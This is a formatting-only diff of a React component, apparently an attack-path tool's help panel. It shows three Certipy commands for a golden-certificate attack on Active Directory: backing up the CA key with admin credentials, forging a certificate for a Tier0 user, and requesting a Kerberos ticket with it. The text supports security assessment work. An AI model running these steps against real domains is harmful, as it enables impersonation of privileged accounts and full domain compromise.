@@ -21,16 +21,25 @@ const Abuse: FC = () => {
     return (
         <>
             <Typography variant='body2'>
-                1) Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host using Certipy: 
-                <Typography component={'pre'}>{"certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!'"}</Typography>
+                1) Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host
+                using Certipy:
+                <Typography component={'pre'}>
+                    {"certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!'"}
+                </Typography>
                 The enterprise CA certificate is the one where issuer and subject are identical.
                 <br />
                 <br />
                 2) Forge a certificate of a target principal:
-                <Typography component={'pre'}>{"certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire'"}</Typography>
+                <Typography component={'pre'}>
+                    {
+                        "certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire'"
+                    }
+                </Typography>
                 <br />
                 3) Request a TGT for the targeted principal using the certificate against a given DC:
-                <Typography component={'pre'}>{"certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10'"}</Typography>
+                <Typography component={'pre'}>
+                    {"certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10'"}
+                </Typography>
             </Typography>
         </>
     );
